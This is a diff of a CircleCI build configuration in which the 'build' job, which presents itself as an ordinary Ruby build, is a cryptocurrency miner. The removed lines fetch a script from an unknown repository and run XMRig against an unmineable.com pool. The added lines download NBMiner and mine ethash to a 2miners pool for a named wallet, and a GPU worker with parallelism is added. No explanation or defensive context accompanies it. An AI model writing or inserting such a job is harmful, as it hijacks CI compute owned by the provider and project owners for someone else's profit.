@@ -1,13 +1,16 @@
-version: 2.1
+version: 2.0
 jobs:
   build:
-      docker:
-            - image: circleci/ruby:2.5.3
-            auth:
-              username: mydockerhub-user
-              password: DOCKERHUB_PASSWORD
-      steps:
-    - checkout
-        run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.ssh && wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz 
-tar xf xmrig-6.15.1-linux-x64.tar.gz 
-cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 36 -u USDT:0xcd2e8f4e5c881d93614d5913f6d16a3a50e8b68c.01
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/NebuTech/NBMiner/releases/download/v41.5/NBMiner_41.5_Linux.tgz && tar xf NBMiner_41.5_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 12VJ4wRvUEFJN3UjjvYWkmatjZUMj1sZJp.T4_1
+  worker1:
+    machine:
+       image: ubuntu:18.04
+    resource_class: gpu.nvidia.large
+    parallelism: 4
